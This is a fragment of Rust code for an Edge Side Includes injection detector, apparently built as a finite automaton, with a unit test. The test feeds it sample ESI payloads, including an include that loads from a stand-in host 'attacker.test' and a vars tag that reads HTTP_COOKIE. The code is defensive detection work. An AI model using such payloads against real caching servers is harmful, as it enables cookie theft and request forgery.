...
impl EsiInjectionDfaBuilder {
    ...
    pub fn build(self) -> EsiInjectionDfa {
        EsiInjectionDfa
    }
}
...
#[cfg(test)]
mod tests {
    use super::EsiInjectionDfaBuilder;

    #[test]
    fn detects_esi_directives_with_case_and_spacing_variants() {
        let dfa = EsiInjectionDfaBuilder::new().build();

        assert_eq!(
            dfa.detect("<esi:include src=\"http://attacker.test/x\" />")
                .as_deref(),
            Some("<esi:include")
        );
        assert_eq!(
            dfa.detect("<ESI:VARS>$(HTTP_COOKIE)</ESI:VARS>").as_deref(),
            Some("<esi:vars")
        );
        assert_eq!(
            dfa.detect("<esi:try><esi:attempt>x</esi:attempt></esi:try>")
                .as_deref(),
            Some("<esi:try")
        );
        assert_eq!(
            dfa.detect("< esi : remove >x</esi:remove>").as_deref(),
            Some("<esi:remove")
        );
        assert_eq!(
            dfa.detect("<!--esi <esi:include src=\"x\" /> -->")
                .as_deref(),
            Some("<!--esi")
        );
    }
